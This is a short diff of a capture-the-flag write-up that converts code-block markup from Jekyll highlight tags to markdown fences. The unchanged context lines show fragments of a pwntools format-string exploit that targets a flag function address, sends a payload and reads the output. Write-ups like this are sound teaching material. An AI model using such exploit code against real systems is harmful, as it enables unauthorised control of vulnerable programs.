@@ -48,7 +48,7 @@ Adjusting the number of printed chars to fit the flag address we have the exploi
 
 TADAAA
 
-{% highlight python %}
+```python
 from pwn import *
 
 flag_func = 0x0804870B
@@ -67,4 +67,4 @@ print p.recvline(False)
 p.sendline(format)
 
 print p.readall()
-{% endhighlight %}
+```
